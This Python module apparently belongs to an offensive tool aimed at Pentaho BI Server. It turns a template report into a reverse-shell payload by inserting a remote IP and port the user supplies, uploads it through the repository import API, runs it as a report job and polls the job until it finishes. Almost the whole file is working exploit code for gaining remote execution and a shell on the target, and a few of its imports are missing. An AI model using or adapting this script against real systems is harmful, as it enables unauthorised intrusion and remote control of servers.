#!/usr/bin/python3
from modules import config


def shell_upload():
	if config.is_anon:
		return
	remote_ip = input('Remote IP: ').encode()
	remote_port = input('Remote port: ').encode()
	with zipfile.ZipFile('basic.prpt') as inzip, zipfile.ZipFile('whoami2.prpt', 'w') as outzip:
		# Iterate the input files
		for inzipinfo in inzip.infolist():
			# Read input file
			with inzip.open(inzipinfo) as infile:
				if inzipinfo.filename == "datadefinition.xml":
					content = infile.read()
					# Modify the content of the file by replacing a string
					content = content.replace(b"192.168.0.59", remote_ip)
					content = content.replace(b"4444", remote_port)
					# Write content
					outzip.writestr(inzipinfo.filename, content)
				else:
					outzip.writestr(inzipinfo.filename, infile.read())

	# try to upoload a file, atm in default user directory
	print ("- Upload file")
	files = {'fileUpload': open('whoami2.prpt','rb')}
	values = {"overwriteFile": "true", "logLevel": "ERROR", "retainOwnership": "true", "fileNameOverride": "whoami2.prpt", "importDir": "/home/"+config.username}

	r = config.session.post(f"{config.pentaho_path}/api/repo/files/import", files=files, data=values, proxies=config.proxies)
	
	if r.status_code != 200:
		print ('Sorry, something went wrong')
		print (r.text)
		return
	#
	# TODO handle fail upload
	#
	
	# 4. Execute file

	print ("- Sending parameters")
	values = {"output-target":"pageable/text","accepted-page":"0","showParameters":"true","renderMode":"PARAMETER","htmlProportionalWidth":"false","query-limit-ui-enabled":"true","query-limit":"0","maximum-query-limit":"0", "ts": int(time.time())}
	response = config.session.post(f"{config.pentaho_path}/api/repos/%3Ahome%3A{config.username}%3Awhoami2.prpt/parameter", proxies=config.proxies, data=values)



	print ("- Reserving ID")
	#reserve ID
	response = config.session.post(f"{config.pentaho_path}/plugin/reporting/api/jobs/reserveId", proxies=config.proxies)
	json_res = json.loads(response.text)
	reserve_id = json_res["reservedId"]

	print ("Sending the Job")
	values = {"output-target":"pageable/text","accepted-page":"0","showParameters":"true","renderMode":"REPORT","htmlProportionalWidth":"false","query-limit-ui-enabled":"true","query-limit":"0","maximum-query-limit":"0","reservedId":reserve_id, "ts": int(time.time())}
	response = config.session.post(f"{config.pentaho_path}/api/repos/%3Ahome%3A{config.username}%3Awhoami2.prpt/reportjob", proxies=config.proxies, data=values)

	while True:
		response = config.session.get(f"{config.pentaho_path}/plugin/reporting/api/jobs/{reserve_id}/status",  proxies=config.proxies)
		json_res = json.loads(response.text)
		if json_res["status"] == "FINISHED":
			break
		if json_res["status"] == "FAILED":
			print ("Upsi, something went wrong")
			break
		print ("Job still running")
		time.sleep(2)
	
	response = config.session.post(f"{config.pentaho_path}/plugin/reporting/api/jobs/{reserve_id}/content", proxies=config.proxies)
	print(response.text)